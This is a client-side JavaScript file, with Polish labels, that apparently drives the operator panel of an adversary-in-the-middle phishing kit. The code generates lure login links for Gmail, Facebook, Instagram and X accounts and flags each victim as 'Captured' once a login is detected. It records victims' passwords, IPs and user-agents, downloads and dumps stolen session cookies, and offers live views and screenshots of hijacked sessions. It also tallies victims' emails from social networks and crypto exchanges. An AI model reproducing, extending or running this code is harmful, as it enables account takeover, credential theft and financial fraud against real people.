const $ = (s) => document.querySelector(s);

/* ── PIN storage ── */
function getPin() { try { return localStorage.getItem('pin') || ''; } catch { return ''; } }
function setPin(p) { try { localStorage.setItem('pin', p); } catch {} }

/* ── API helper ── */
const api = (path, opts = {}) => {
  const pin = getPin();
  const headers = {
    ...(opts.body ? { 'content-type': 'application/json' } : {}),
    ...(pin ? { 'x-pin': pin } : {}),
    ...(opts.headers || {}),
  };
  return fetch(path, { credentials: 'same-origin', ...opts, headers });
};

function labelToId(s) {
  return s.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
}

/* ── Tab switching ── */
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  $(`#tab-${name}`).classList.add('active');
  document.querySelector(`[data-tab="${name}"]`).classList.add('active');
  if (name === 'accounts') renderAccountsTab();
  if (name === 'logs') startLogPolling(); else stopLogPolling();
}

document.querySelectorAll('.nav-item').forEach(btn => {
  btn.addEventListener('click', () => switchTab(btn.dataset.tab));
});

/* ══════════════════════════════════════════════════════════
   GENERATE LINK TAB
══════════════════════════════════════════════════════════ */
let selectedAccountId = null;

async function renderGenerateTab() {
  const res = await api('/api/accounts');
  if (res.status === 401) { showLogin(); return; }
  const accounts = await res.json();
  const sortMode = $('#genSort')?.value || 'default';
  const sorted = sortAccounts(accounts, sortMode);
  const grid = $('#genAccounts');
  grid.innerHTML = '';

  for (const a of sorted) {
    const chip = document.createElement('div');
    chip.className = 'acct-chip';

    const btn = document.createElement('button');
    btn.className = 'acct-chip-btn';
    btn.textContent = a.label;
    btn.title = 'Zobacz link i szczegóły w zakładce Accounts';
    btn.onclick = async () => {
      selectedAccountId = a.id;
      switchTab('accounts');
      await renderAccountsTab();
      const card = $(`.acct-card[data-id="${CSS.escape(a.id)}"]`);
      if (card) {
        card.scrollIntoView({ behavior: 'smooth', block: 'center' });
        if (!card.classList.contains('open')) card.querySelector('.acct-card-header').click();
      }
    };

    const del = document.createElement('button');
    del.className = 'acct-chip-del';
    del.textContent = '×';
    del.title = 'Usuń konto';
    del.onclick = async (e) => {
      e.stopPropagation();
      if (!confirm(`Usunąć "${a.label}"?`)) return;
      await api(`/api/accounts/${encodeURIComponent(a.id)}`, { method: 'DELETE' });
      renderGenerateTab();
    };

    chip.append(btn, del);
    grid.append(chip);
  }
}

/* ── Add account ── */
$('#addBtn').addEventListener('click', () => {
  $('#addBox').hidden = false;
  $('#addBtn').style.display = 'none';
  $('#addName').focus();
});

$('#addCancel').addEventListener('click', () => {
  $('#addBox').hidden = true;
  $('#addBtn').style.display = '';
  $('#addName').value = '';
});

document.querySelectorAll('.plat-btn').forEach(btn => {
  btn.addEventListener('click', async () => {
    const name = $('#addName').value.trim();
    if (!name) { $('#addName').focus(); $('#addName').style.borderColor = 'var(--red)'; return; }
    $('#addName').style.borderColor = '';
    const id = labelToId(`${name}-${btn.dataset.platform}`);
    if (!id) { alert('Nazwa zawiera niedozwolone znaki.'); return; }
    const platLabel = btn.querySelector('span:not(.plat-icon)')?.textContent.trim() || btn.dataset.platform;
    const res = await api('/api/accounts', {
      method: 'POST',
      body: JSON.stringify({ id, label: `${name} – ${platLabel}`, startUrl: btn.dataset.url }),
    });
    if (!res.ok) { const e = await res.json().catch(()=>({})); alert('Błąd: '+(e.error||res.status)); return; }
    $('#addCancel').click();
    renderGenerateTab();
  });
});

/* ══════════════════════════════════════════════════════════
   SORTING
══════════════════════════════════════════════════════════ */
function detectPlatform(a) {
  const url = (a.startUrl || '').toLowerCase();
  if (/mail\.google\.com|gmail\.com/.test(url)) return 'gmail';
  if (/facebook\.com/.test(url)) return 'facebook';
  if (/instagram\.com/.test(url)) return 'instagram';
  if (/x\.com|twitter\.com/.test(url)) return 'twitter';
  return 'other';
}

function sortAccounts(accounts, mode) {
  const sorted = [...accounts];
  const cmp = (a, b) => (a || '').localeCompare(b || '', 'pl', { sensitivity: 'base' });
  switch (mode) {
    case 'name-asc':
      sorted.sort((a, b) => cmp(a.label, b.label));
      break;
    case 'name-desc':
      sorted.sort((a, b) => cmp(b.label, a.label));
      break;
    case 'email-asc':
      sorted.sort((a, b) => cmp(a.email, b.email));
      break;
    case 'email-desc':
      sorted.sort((a, b) => cmp(b.email, a.email));
      break;
    case 'platform': {
      const order = { gmail: 0, facebook: 1, instagram: 2, twitter: 3, other: 4 };
      sorted.sort((a, b) => (order[detectPlatform(a)] ?? 9) - (order[detectPlatform(b)] ?? 9) || cmp(a.label, b.label));
      break;
    }
  }
  return sorted;
}

/* ══════════════════════════════════════════════════════════
   ACCOUNTS TAB
══════════════════════════════════════════════════════════ */
async function renderAccountsTab() {
  const res = await api('/api/accounts');
  if (!res.ok) return;
  const accounts = await res.json();
  const sortMode = $('#acctSort')?.value || 'default';
  const sorted = sortAccounts(accounts, sortMode);
  const list = $('#acctList');
  list.innerHTML = '';

  for (const [i, a] of sorted.entries()) {
    const card = buildAccountCard(a, i * 0.05);
    list.append(card);
  }
}

$('#acctSort')?.addEventListener('change', () => renderAccountsTab());

const isGmailAccount = (a) =>
  /mail\.google\.com|gmail\.com/i.test(a.startUrl || '');

function buildAccountCard(a, delay) {
  const card = document.createElement('div');
  card.className = 'acct-card';
  card.dataset.id = a.id;
  card.style.animationDelay = `${delay}s`;

  const initial = (a.label || '?')[0].toUpperCase();
  const mailStatsBtn = isGmailAccount(a)
    ? `<button class="btn-mail-stats ghost-btn">📊 Statystyki maili</button>`
    : '';

  card.innerHTML = `
    <div class="acct-card-header">
      <div class="acct-avatar-placeholder">${initial}</div>
      <div class="acct-card-meta">
        <div class="acct-card-name">${a.label} <span class="captured-badge" hidden>✓ Captured</span></div>
        <div class="acct-card-hint">${a.email || a.startUrl || ''}</div>
      </div>
      <span class="acct-card-toggle">▼</span>
    </div>
    <div class="acct-card-body">
      <div class="link-result">
        <label class="field-label">Link do podglądu</label>
        <div class="link-row">
          <input class="f-link" readonly/>
          <button class="btn-copy">Kopiuj</button>
        </div>
      </div>
      <button class="btn-preview ghost-btn">👁 Pokaż podgląd</button>
      ${mailStatsBtn}
      <img class="acct-thumb" alt="podgląd"/>
      <div class="info-grid">
        <div class="info-field">
          <label>Email / Login</label>
          <input class="f-email" type="text" placeholder="np. jan@gmail.com" value="${a.email || ''}"/>
        </div>
        <div class="info-field">
          <label>Hasło</label>
          <input class="f-pass" type="password" placeholder="••••••••" value="${a.password || ''}"/>
        </div>
        <div class="info-field">
          <label>Wykryty login</label>
          <input class="f-hint" type="text" placeholder="ładowanie..." readonly/>
        </div>
        <div class="info-field">
          <label>IP (przez proxy, nie Twoje)</label>
          <input class="f-ip" type="text" placeholder="ładowanie..." readonly/>
        </div>
        <div class="info-field" style="grid-column:1/-1">
          <label>User-Agent</label>
          <input class="f-ua" type="text" placeholder="ładowanie..." readonly/>
        </div>
        <div class="info-field" style="grid-column:1/-1">
          <label>Notatki</label>
          <input class="f-notes" type="text" placeholder="dowolne notatki..." value="${a.notes || ''}"/>
        </div>
      </div>
      <div class="acct-actions">
        <a class="btn-view" target="_blank" rel="noopener">🔴 Podgląd na żywo</a>
        <button class="btn-save">Zapisz</button>
        <button class="btn-dl">⬇ Cookies</button>
        <button class="btn-refresh ghost-btn">↻ Odśwież info</button>
        <button class="btn-del">Usuń konto</button>
      </div>
    </div>`;

  const pin = getPin();
  const viewUrl = `${location.origin}/account/login?ref=${encodeURIComponent(a.ref)}${pin ? `&p=${encodeURIComponent(pin)}` : ''}`;
  card.querySelector('.btn-view').href = viewUrl;
  card.querySelector('.f-link').value = viewUrl;
  card.querySelector('.btn-copy').onclick = async (e) => {
    e.stopPropagation();
    try { await navigator.clipboard.writeText(viewUrl); }
    catch { card.querySelector('.f-link').select(); document.execCommand('copy'); }
    const btn = card.querySelector('.btn-copy');
    btn.textContent = 'Skopiowano ✓';
    setTimeout(() => btn.textContent = 'Kopiuj', 2000);
  };

  /* toggle open/close — no longer auto-loads the preview; that's opt-in
     via the "Pokaż podgląd" button, so just expanding a card to edit its
     saved notes/email doesn't also wake up its browser session. */
  const header = card.querySelector('.acct-card-header');
  header.onclick = () => card.classList.toggle('open');

  /* preview (screenshot + live info) — fetched only on request */
  card.querySelector('.btn-preview').onclick = () => loadCardInfo(card, a);

  /* Gmail mail stats */
  const mailStatsEl = card.querySelector('.btn-mail-stats');
  if (mailStatsEl) mailStatsEl.onclick = () => openMailStatsModal(a);

  /* save */
  card.querySelector('.btn-save').onclick = async () => {
    await api(`/api/accounts/${encodeURIComponent(a.id)}`, {
      method: 'PATCH',
      body: JSON.stringify({
        email:    card.querySelector('.f-email').value,
        password: card.querySelector('.f-pass').value,
        notes:    card.querySelector('.f-notes').value,
      }),
    });
    const btn = card.querySelector('.btn-save');
    btn.textContent = 'Zapisano ✓';
    setTimeout(() => btn.textContent = 'Zapisz', 2000);
  };

  /* cookies download */
  card.querySelector('.btn-dl').onclick = () => {
    const pin = getPin();
    const url = `/api/accounts/${encodeURIComponent(a.id)}/cookies${pin ? `?pin=${encodeURIComponent(pin)}` : ''}`;
    Object.assign(document.createElement('a'), { href: url, download: `${a.id}-cookies.json` }).click();
  };

  /* refresh info */
  card.querySelector('.btn-refresh').onclick = () => loadCardInfo(card, a);

  /* delete */
  card.querySelector('.btn-del').onclick = async () => {
    if (!confirm(`Usunąć "${a.label}"?`)) return;
    await api(`/api/accounts/${encodeURIComponent(a.id)}`, { method: 'DELETE' });
    card.style.opacity = '0';
    card.style.transform = 'translateY(-8px)';
    card.style.transition = 'all .2s ease';
    setTimeout(() => card.remove(), 200);
  };

  return card;
}

async function loadCardInfo(card, a) {
  const pin = getPin();

  /* screenshot */
  const thumb = card.querySelector('.acct-thumb');
  const ts = Date.now();
  thumb.src = `/api/accounts/${encodeURIComponent(a.id)}/screenshot?t=${ts}${pin ? `&pin=${encodeURIComponent(pin)}` : ''}`;
  thumb.style.display = 'block';
  thumb.style.opacity = '0.5';
  thumb.onload = () => { thumb.style.opacity = '1'; };

  /* info */
  const infoRes = await api(`/api/accounts/${encodeURIComponent(a.id)}/info`);
  if (!infoRes.ok) return;
  const info = await infoRes.json();

  if (info.loginHint) {
    card.querySelector('.f-hint').value = info.loginHint;
    card.querySelector('.acct-card-hint').textContent = info.loginHint;
    card.classList.add('captured');
    card.querySelector('.captured-badge').hidden = false;
  } else {
    card.classList.remove('captured');
    card.querySelector('.captured-badge').hidden = true;
  }
  card.querySelector('.f-ip').value = info.ip || 'nieznane';
  card.querySelector('.f-ua').value = info.userAgent || 'nieznane';
  if (info.avatarUrl) {
    const header = card.querySelector('.acct-card-header');
    const existingImg = header.querySelector('.acct-avatar');
    if (existingImg) {
      existingImg.src = info.avatarUrl;
    } else {
      const placeholder = header.querySelector('.acct-avatar-placeholder');
      const img = document.createElement('img');
      img.className = 'acct-avatar';
      img.src = info.avatarUrl;
      img.onerror = () => img.remove();
      placeholder?.replaceWith(img);
    }
  }
}

/* ══════════════════════════════════════════════════════════
   LIVE TIME LOGS — remote-page activity (navigation, captures),
   polled from the server while this tab is open.
══════════════════════════════════════════════════════════ */
let logsPollTimer = null;
let logsSince = 0;

async function pollLogsOnce() {
  const res = await api(`/api/logs?since=${logsSince}`);
  if (!res.ok) return;
  const entries = await res.json();
  const typeMap = { capture: 'success', nav: 'info', open: 'open', fill: 'fill', clear: 'clear' };
  for (const e of entries) {
    logsSince = Math.max(logsSince, e.ts);
    window.addLog?.(`[${e.accountId}] ${e.message}`, typeMap[e.type] || 'info');
  }
}

function startLogPolling() {
  if (logsPollTimer) return;
  logsSince = Date.now() - 10000; // show a little recent history on open
  pollLogsOnce();
  logsPollTimer = setInterval(pollLogsOnce, 3000);
}

function stopLogPolling() {
  clearInterval(logsPollTimer);
  logsPollTimer = null;
}

/* ── Cookie dump into the log feed ── */
$('#dumpCookiesBtn')?.addEventListener('click', async () => {
  window.addLog?.('=== Zrzut cookies ===', 'cookie');
  const res = await api('/api/accounts');
  if (!res.ok) return;
  const accounts = await res.json();
  for (const a of accounts) {
    const r = await api(`/api/accounts/${encodeURIComponent(a.id)}/cookies`);
    if (!r.ok) {
      window.addLog?.(`[${a.id}] (sesja nieaktywna, brak cookies)`, 'clear');
      continue;
    }
    const cookies = await r.json();
    if (!cookies.length) { window.addLog?.(`[${a.id}] brak cookies`, 'clear'); continue; }
    for (const c of cookies) {
      window.addLog?.(`[${a.id}] 🍪 ${c.name}=${c.value} (${c.domain})`, 'cookie');
    }
  }
});

/* ══════════════════════════════════════════════════════════
   LOGIN / BOOT
══════════════════════════════════════════════════════════ */
function showLogin() {
  location.replace('/login.html');
}

$('#logoutBtn').addEventListener('click', () => {
  try { localStorage.removeItem('pin'); } catch {}
  showLogin();
});

async function boot() {
  const res = await api('/api/accounts');
  if (res.status === 401) { showLogin(); return; }
  renderGenerateTab();
}
boot();

/* ══════════════════════════════════════════════════════════
   GMAIL MAIL STATS MODAL
══════════════════════════════════════════════════════════ */

function fmt(n) {
  if (n === null || n === undefined) return '—';
  return n.toLocaleString('pl-PL');
}

function buildStatsHTML(stats) {
  if (stats.error) {
    return `<p class="stats-error">Błąd: ${stats.error === 'not_logged_in' ? 'Konto nie jest zalogowane w Gmail.' : stats.error}</p>`;
  }

  const source = stats._source === 'api'
    ? '<span class="stats-source stats-source-api">Gmail API</span>'
    : '<span class="stats-source stats-source-spa">SPA (przybliżone)</span>';

  const rows = [
    { section: 'Skrzynka' },
    { label: '📥 Skrzynka odbiorcza',   val: stats.inbox },
    { label: '📤 Wysłane',               val: stats.sent },
    { label: '👥 Kontakty',              val: stats.contacts },
    { section: 'Kategorie Gmail' },
    { label: '👥 Społecznościowe',       val: stats.social },
    { label: '🛍 Promocje',              val: stats.promotions },
    { label: '🔔 Powiadomienia',         val: stats.updates },
    { label: '💬 Fora',                  val: stats.forums },
    { section: 'Social Media' },
    { label: 'Facebook',    val: stats.facebook },
    { label: 'Instagram',   val: stats.instagram },
    { label: 'Twitter / X', val: stats.twitter },
    { label: 'LinkedIn',    val: stats.linkedin },
    { label: 'TikTok',      val: stats.tiktok },
    { label: 'YouTube',     val: stats.youtube },
    { section: 'Finanse' },
    { label: '₿ Giełdy kryptowalut', val: stats.exchanges },
  ];

  let html = `<div class="stats-source-row">Źródło: ${source}</div>`;
  html += '<table class="stats-table">';
  for (const r of rows) {
    if (r.section) {
      html += `<tr class="stats-section-row"><td colspan="2">${r.section}</td></tr>`;
    } else {
      html += `<tr><td>${r.label}</td><td class="stats-num">${fmt(r.val)}</td></tr>`;
    }
  }
  html += '</table>';

  if (stats.storage) {
    html += `<p class="stats-storage">💾 Pamięć: ${stats.storage.used} z ${stats.storage.total} (${stats.storage.percent}%)</p>`;
  }
  return html;
}

function openMailStatsModal(a) {
  // Remove any existing modal
  document.querySelector('.mail-stats-overlay')?.remove();

  const overlay = document.createElement('div');
  overlay.className = 'mail-stats-overlay';
  overlay.innerHTML = `
    <div class="mail-stats-modal">
      <div class="mail-stats-header">
        <span>📊 Statystyki maili — ${a.label}</span>
        <button class="mail-stats-close">×</button>
      </div>
      <div class="mail-stats-body">
        <div class="mail-stats-progress">
          <div class="mail-stats-spinner"></div>
          <div class="mail-stats-step">Łączenie z Gmail...</div>
          <p class="mail-stats-note">Analiza może potrwać do 2 minut.</p>
        </div>
        <div class="mail-stats-result" hidden></div>
      </div>
    </div>`;

  document.body.appendChild(overlay);

  const closeBtn = overlay.querySelector('.mail-stats-close');
  const stepEl   = overlay.querySelector('.mail-stats-step');
  const progress = overlay.querySelector('.mail-stats-progress');
  const result   = overlay.querySelector('.mail-stats-result');

  let closed = false;
  const close = () => { closed = true; overlay.remove(); };
  closeBtn.onclick = close;
  overlay.onclick = (e) => { if (e.target === overlay) close(); };

  // Use SSE endpoint to get live progress + final result
  const pin = getPin();
  const sseUrl = `/api/accounts/${encodeURIComponent(a.id)}/mail-stats/progress${pin ? `?pin=${encodeURIComponent(pin)}` : ''}`;
  const es = new EventSource(sseUrl);

  es.onmessage = (ev) => {
    if (closed) { es.close(); return; }
    let msg;
    try { msg = JSON.parse(ev.data); } catch { return; }

    if (msg.step) {
      stepEl.textContent = msg.step;
    }
    if (msg.done) {
      es.close();
      progress.hidden = true;
      result.hidden = false;
      result.innerHTML = buildStatsHTML(msg.stats || { error: msg.error || 'unknown' });
    }
  };

  es.onerror = () => {
    if (closed) return;
    es.close();
    progress.hidden = true;
    result.hidden = false;
    result.innerHTML = '<p class="stats-error">Błąd połączenia z serwerem.</p>';
  };
}
